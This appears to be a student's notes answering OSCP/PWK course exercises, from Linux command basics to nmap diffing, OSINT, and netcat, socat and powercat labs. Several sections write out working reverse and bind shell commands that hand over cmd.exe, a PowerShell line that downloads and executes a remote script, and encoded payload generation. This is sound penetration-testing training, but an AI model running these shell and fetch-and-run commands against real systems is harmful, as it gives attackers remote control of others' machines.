# oscp-exercises
## 2.4.3.4 (page 42)
1. Use man to look at the man page for one of your preferred commands.
```
man nmap
```
2. Use man to look for a keyword related to file compression.
```
man -k compress
```
3. Use which to locate the pwd command on your Kali virtual machine.
```
kali@kali:~$ which pwd
/usr/bin/pwd
```
4. Use locate to locate wce32.exe on your Kali virtual machine.
```
kali@kali:~$ locate wce32.exe
/usr/share/windows-resources/wce/wce32.exe
```
5. Use find to identify any file (not directory) modified in the last day, NOT owned by the root user and execute ls -l on them. Chaining/piping commands is NOT allowed!
```
find . -type f -mtime -1 ! -user root -exec ls -l {} \; 2>/dev/null
```

## 3.1.3.2 (page 53) 
1. Inspect your bash history and use history expansion to re-run a command from it.
2. Execute different commands of your choice and experiment browsing the history through the shortcuts as well as the reverse-i-search facility.

## 3.2.5.1 (page 55) 
1. Use the cat command in conjunction with sort to reorder the content of the /etc/passwd file on your Kali Linux system.
`cat /etc/passwd | sort`
2. Redirect the output of the previous exercise to a file of your choice in your home directory.
`cat /etc/passwd | sort >> ~/ordered_passwd.txt`

## 3.3.5.1 (page 59)
Using /etc/passwd, extract the user and home directory fields for all users on your Kali machine for which the shell is set to /bin/false. Make sure you use a Bash one-liner to print the output to the screen. The output should look similar to Listing 53 below:
```
The user mysql home directory is /nonexistent
The user Debian-snmp home directory is /var/lib/snmp
The user speech-dispatcher home directory is /var/run/speech-dispatcher The user Debian-gdm home directory is /var/lib/gdm3
```

Solution:
```
cat /etc/passwd | grep /bin/false | awk -F ":" '{ printf("The user %s home directory is %s\n", $1, $6)}'
```

Output:
```
The user mysql home directory is /nonexistent
The user tss home directory is /var/lib/tpm
The user Debian-snmp home directory is /var/lib/snmp
The user lightdm home directory is /var/lib/lightdm
```

Copy the /etc/passwd file to your home directory (/home/kali):
```
cp /etc/passwd ~
```

Use cat in a one-liner to print the output of the /kali/passwd and replace all instances of the
"Gnome Display Manager" string with "GDM":
```
cat passwd | sed 's/Gnome Display Manager/GDM/'
```

## 3.5.3.1 (page 64)  COMPLETE THIS BORING SHIT
1. Download the archive from the following URL https://offensive-security.com/pwk-files/scans.tar.gz
```
wget https://offensive-security.com/pwk-files/scans.tar.gz
```

2. This archive contains the results of scanning the same target machine at different times. Extract the archive and see if you can spot the differences by diffing the scans.
```
tar xvzf scans.tar.gz
cd scans
```

Diff 10.11.1.118 using `diff`:
```
kali@kali:~/pwk/scans$ diff -u 10.11.1.118_scan_01.txt 10.11.1.118_scan_02.txt 
--- 10.11.1.118_scan_01.txt	2020-01-22 07:25:58.000000000 -0500
+++ 10.11.1.118_scan_02.txt	2020-01-22 07:32:36.000000000 -0500
@@ -1,10 +1,61 @@
 kali@kali:~$ sudo nmap 10.11.1.118 -p- -sV -vv --open --reason
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 14:20 EET
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 14:26 EET
 NSE: Loaded 45 scripts for scanning.
-Initiating Ping Scan at 14:20
+Initiating Ping Scan at 14:26
 Scanning 10.11.1.118 [4 ports]
-Completed Ping Scan at 14:20, 3.01s elapsed (1 total hosts)
+Completed Ping Scan at 14:26, 0.13s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:26
+Completed Parallel DNS resolution of 1 host. at 14:26, 0.03s elapsed
+Initiating SYN Stealth Scan at 14:26
+Scanning 10.11.1.118 [65535 ports]
+Discovered open port 445/tcp on 10.11.1.118
+Discovered open port 3389/tcp on 10.11.1.118
+Discovered open port 135/tcp on 10.11.1.118
+Discovered open port 139/tcp on 10.11.1.118
+Discovered open port 49666/tcp on 10.11.1.118
+Discovered open port 49667/tcp on 10.11.1.118
+Discovered open port 49673/tcp on 10.11.1.118
+Discovered open port 49668/tcp on 10.11.1.118
+SYN Stealth Scan Timing: About 24.74% done; ETC: 14:28 (0:01:34 remaining)
+Discovered open port 5040/tcp on 10.11.1.118
+Discovered open port 49664/tcp on 10.11.1.118
+Discovered open port 49669/tcp on 10.11.1.118
+Discovered open port 49665/tcp on 10.11.1.118
+Completed SYN Stealth Scan at 14:27, 73.24s elapsed (65535 total ports)
+Initiating Service scan at 14:27
+Scanning 12 services on 10.11.1.118
+Service scan Timing: About 41.67% done; ETC: 14:29 (0:01:18 remaining)
+Completed Service scan at 14:29, 129.34s elapsed (12 services on 1 host)
+NSE: Script scanning 10.11.1.118.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 14:29
+Completed NSE at 14:29, 1.04s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 14:29
+Completed NSE at 14:29, 1.01s elapsed
+Nmap scan report for 10.11.1.118
+Host is up, received echo-reply ttl 127 (0.14s latency).
+Scanned at 2020-01-22 14:26:09 EET for 205s
+Not shown: 64843 closed ports, 680 filtered ports
+Reason: 64843 resets and 680 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       REASON          VERSION
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+5040/tcp  open  unknown       syn-ack ttl 127
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
 Read data files from: /usr/bin/../share/nmap
-Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
-Nmap done: 1 IP address (0 hosts up) scanned in 3.28 seconds
-           Raw packets sent: 8 (304B) | Rcvd: 0 (0B)
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 205.14 seconds
+           Raw packets sent: 80818 (3.556MB) | Rcvd: 70240 (2.810MB)
+
```
Analyzing the results it is clear that the server was down for the first run of nmap and up for the second one.

## 3.6.3.1 Exercises (page 68)
1. Find files that have changed on your Kali virtual machine within the past 7 days by running a specific command in the background.
```
kali@kali:~$ find / -type f -mtime -7 -exec ls {} \; >> modified_last_7_days.txt 2> /dev/null &
[1] 731801
```
2. Re-run the previous command and suspend it; once suspended, background it:
Run it again:
```
kali@kali:~$ find / -type f -mtime -7 -exec ls {} \; >> modified_last_7_days_2.txt 2> /dev/null
^Z
[2]+  Stopped                 find / -type f -mtime -7 -exec ls {} \; >> modified_last_7_days_2.txt 2> /dev/null
kali@kali:~$ bg
[2]+ find / -type f -mtime -7 -exec ls {} \; >> modified_last_7_days_2.txt 2> /dev/null &
```

3. Bring the previous background job into the foreground.
```
kali@kali:~$ fg %1
find / -type f -mtime -7 -exec ls {} \; >> modified_last_7_days.txt 2> /dev/null
```

4. Start the Firefox browser on your Kali system. Use ps and grep to identify Firefox’s PID.
```
kali      984396 45.5  4.0 2806756 330956 ?      Sl   21:07   0:02 /usr/lib/firefox-esr/firefox-esr
kali      984505 25.5  2.1 33926156 172324 ?     Sl   21:07   0:01 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 5670 -prefMapSize 183024 -parentBuildID 20200622191537 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appdir /usr/lib/firefox-esr/browser 984396 true tab
kali      984547 15.0  1.9 2443948 158084 ?      Sl   21:07   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 3 -isForBrowser -prefsLen 6402 -prefMapSize 183024 -parentBuildID 20200622191537 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appdir /usr/lib/firefox-esr/browser 984396 true tab
kali      984583  4.6  0.8 2365740 68900 ?       Sl   21:07   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 4 -isForBrowser -prefsLen 6402 -prefMapSize 183024 -parentBuildID 20200622191537 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appdir /usr/lib/firefox-esr/browser 984396 true tab
kali      984604  0.0  0.0   6088   836 pts/2    S+   21:07   0:00 grep firefox
```

5. Terminate Firefox from the command line using its PID.
```
kali@kali:~$ kill 984396
```

### 3.7.2.1 Exercises (page 69)
1. Start your apache2 web service and access it locally while monitoring its access.log file in real-time.
Start it:
```
$ /etc/init.d/apache2 start
```
Monitor access:
```
$ tail -f /var/log/apache2/access.log 
::1 - - [30/Oct/2020:22:37:53 -0400] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
::1 - - [30/Oct/2020:22:37:53 -0400] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://localhost/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
::1 - - [30/Oct/2020:22:37:53 -0400] "GET /favicon.ico HTTP/1.1" 404 487 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
::1 - - [30/Oct/2020:22:38:20 -0400] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
::1 - - [30/Oct/2020:22:38:20 -0400] "GET /icons/openlogo-75.png HTTP/1.1" 304 181 "http://localhost/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

2. Use a combination of watch and ps to monitor the most CPU-intensive processes on your Kali machine in a terminal window; launch different applications to see how the list changes in real time.

Takes the 20 with greatest CPU percentage usage:
```
watch $'ps aux | tail -n +2 | awk \'{print $3, $11}\' | sort -k1 -r | head -n20'
```

### 3.8.3.1 (page 71)
Download the PoC code for an exploit from https://www.exploit-db.com using curl, wget, and axel, saving each download with a different name.
```
wget -O wget_example_exploit.py https://www.exploit-db.com/download/48977
curl -o curl_example_exploit.py https://www.exploit-db.com/download/48977
axel -a -n 20 -oaxel_example_exploit.py https://www.exploit-db.com/download/48977
```

### 3.9.3.1 (page 72)
1) Create an alias named “..” to change to the parent directory and make it persistent across terminal sessions.

Add to ~/.bashrc:
```
alias ..="cd .."
```

2) Permanently configure the history command to store 10000 entries and include the full date in its output.

Add to .bashrc:
```
export HISTSIZE=10000
export HISTFILESIZE=10000
export HISTTIMEFORMAT='%c'
```

### 4.1.4.3 (page 81) (Reporting is not needed!)
1. Implement a simple chat between your Kali machine and Windows system.
2. Use Netcat to create a:
a. Reverse shell from Kali to Windows.
b. Reverse shell from Windows to Kali.
c. Bind shell on Kali. Use your Windows system to connect to it.
d. Bind shell on Windows. Use your Kali machine to connect to it.
3. Transfer a file from your Kali machine to Windows and vice versa.
4. Conduct the exercises again with the firewall enabled on your Windows system. Adapt the exercises as necessary to work around the firewall protection and understand what portions of the exercise can no longer be completed successfully.

### 4.2.4.1 (page 85)
1. Use socat to transfer powercat.ps1 from your Kali machine to your Windows system. Keep the file on your system for use in the next section.

Make the script available from Kali on port 80:
```
sudo socat TCP4-LISTEN:80,fork file:powercat.ps1
```

Get it from Windows:
```
socat.exe TCP4-CONNECT:10.0.2.15:80 file:powercat.ps1,create
```

2. Use socat to create an encrypted reverse shell from your Windows system to your Kali machine.

Set up listener on Kali box. First create the ssl key and certificate:
```
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 36 -out shell.crt
Generating a RSA private key
.................+++++
...............+++++
writing new private key to 'shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Generate .pem file from them:
```
$ cat shell.key shell.crt > shell.pem
```

Run listener from the Kali machine using as certificate the generated pem file:
```
sudo socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT
```

Trigger reverse shell from Windows:
```
socat.exe OPENSSL-CONNECT:10.0.2.15:4444,verify=0 EXEC:cmd.exe,pipes
```

3. Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?
socat - TCP4-CONNECT:10.0.2.4:4444

Bind shell from the Windows machine:
```
C:\Users\User>repositories\socat-windows\socat.exe -d -d OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:cmd.exe,pipes
      1 [main] socat 5564 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer.  Please report this problem to
the public mailing list cygwin@cygwin.com
2020/11/04 14:01:24 socat[5564] N listening on AF=2 0.0.0.0:4444
```

Connect from Kali using an insecure connection (using TCP4-CONNECT):
```
socat - TCP4-CONNECT:10.0.2.4:4444
```

Even though the connection is accepted on the Windows machine, the shell is not accessible from Kali.

Socat's logs on Windows:
```
2020/11/04 14:01:27 socat[5564] N accepting connection from AF=2 10.0.2.15:42078 on AF=2 10.0.2.4:4444
2020/11/04 14:01:27 socat[5564] N forked off child process 1584
2020/11/04 14:01:27 socat[5564] N listening on AF=2 0.0.0.0:4444
2020/11/04 14:02:15 socat[1584] E SSL_accept(): socket closed by peer
2020/11/04 14:02:15 socat[1584] N exit(1)
2020/11/04 14:02:15 socat[5564] W waitpid(): child 1584 exited with status 1
```

On Kali (shell is not working):
```
$ socat - TCP4-CONNECT:10.0.2.4:4444
whoami
dir
```

4. Make an unencrypted socat bind shell on your Windows system. Connect to the shell using Netcat. Does it work?
Note: If cmd.exe is not executing, research what other parameters you may need to pass to the EXEC option based on the error you receive.

Bind shell from Windows:
```
socat.exe -d -d TCP4-LISTEN:4445,fork EXEC:cmd.exe,pipes
```

Connect from Kali using Netcat:
```
nc 10.0.2.4 4445
Microsoft Windows [Version 10.0.19041.572]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\User>whoami
whoami
windev2009eval\user
```

This proves it is possible to bind a shell using socat (using TCP4) and then connect to it using netcat.

### 4.3.8.1 (page 94)
Boxes IPs:
kali: 10.0.2.15
win: 10.0.2.4

1. Use PowerShell and powercat to create a reverse shell from your Windows system to your Kali machine.

On Kali run the listener:
```
nc -lnvp 4445
```

On Windows, from powershell, run:
```
iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
powercat -c 10.0.2.15 -p 4445 -e cmd.exe
```

2. Use PowerShell and powercat to create a bind shell on your Windows system and connect to it from your Kali machine. Can you also use powercat to connect to it locally?

On Windows:
```
powercat -l -p 4445 -e cmd.exe
```

Connect from Kali:
```
$ nc 10.0.2.4 4445
Microsoft Windows [Version 10.0.19041.572]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\User>
```

It does connect locally from powercat:
```
 powercat -c localhost -p 4445
dir
Microsoft Windows [Version 10.0.19041.572]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\User>
```

3. Use powercat to generate an encoded payload and then have it executed through powershell. Have a reverse shell sent to your Kali machine, also create an encoded bind shell on your Windows system and use your Kali machine to connect to it.

Generate the payloads:
```
powercat -l -p 4445 -e cmd.exe -ge > bind_shell.ps1
powercat -c 10.0.2.15 -p 4445 -e cmd.exe -ge > reverse_shell.ps1
```

To execute them, create another powershell script that stores the entire payload contents in a variable and the executes it:
```
$encoded = "{{payload_contents}}"
powershell -EncodedCommand $encoded
```

### 4.4.5.1 (page 99) (WIRESHARK - IT NEEDS THE LAB!!!)
1. Use Wireshark to capture network activity while attempting to connect to 10.11.1.217 on port 110 using Netcat, and then attempt to log into it.
2. Read and understand the output. Where is the three-way handshake happening? Where is the connection closed?
3. Follow the TCP stream to read the login attempt.
4. Use the display filter to only monitor traffic on port 110.
5. Run a new session, this time using the capture filter to only collect traffic on port 110.

### 4.5.3.1 (page 104, DEPENDS ON WIRESHARK)
1. Use tcpdump to recreate the Wireshark exercise of capturing traffic on port 110.
2. Use the -X flag to view the content of the packet. If data is truncated, investigate how the -s
flag might help.
3. Find all ‘SYN’, ‘ACK’, and ‘RST’ packets in the password_cracking_filtered.pcap file.
4. An alternative syntax is available in tcpdump where you can use a more user-friendly filter to display only ACK and PSH packets. Explore this syntax in the tcpdump manual by searching for “tcpflags”. Come up with an equivalent display filter using this syntax to filter ACK and PSH packets.

### 5.7.3.1 Bash (page 133)
1. Research Bash loops and write a short script to perform a ping sweep of your target IP range of 10.11.1.0/24.
2. Try to do the above exercise with a higher-level scripting language such as Python, Perl, or Ruby.
## do these 2 above that depend on the lab

3. Use the practical examples in this module to help you create a Bash script that extracts JavaScript files from the access_log.txt file (http://www.offensive-security.com/pwk-files/access_log.txt.gz). Make sure the file names DO NOT include the path, are unique, and are sorted.
```
$ grep -o '[^/]*\.js ' access_log.txt | sort | uniq
jquery.js
jquery.jshowoff.min.js
jquery.jshowoff2.js
```

4. Re-write the previous exercise in another language such as Python, Perl, or Ruby.
In Python, just printing file names to console:
```
import re

with open('access_log.txt', 'r') as f:
    data = f.read()
    files_with_dups = re.findall('[^/]*\.js ', data);
    files = list(set(files_with_dups))
    files.sort()
    print(files)
```

### 6.4.1.1 (page 145)
1. Who is the VP of Legal for MegaCorp One and what is their email address?

The first result when googling "VP of Legal MegaCorp One" is the [contact page](https://www.megacorpone.com/contact.html) which contains the VP of Legal's contact info:
```
Name: Mike Carlow
Title: VP Of Legal
Email: mcarlow@megacorpone.com
```

2. Use Google dorks (either your own or any from the GHDB) to search www.megacorpone.com for interesting documents.

By doing a google search to exclude html files on the MegaCorp One site: `site:www.megacorpone.com -filetype:html`, some interesting results such as images that do not appear on the site plus [assets of the old site](http://www.megacorpone.com/old-site/).

3. What other MegaCorp One employees can you identify that are not listed on www.megacorpone.com?
There are some pictures at `http://www.megacorpone.com/assets/img/team/orig/` that are not listed on the page.


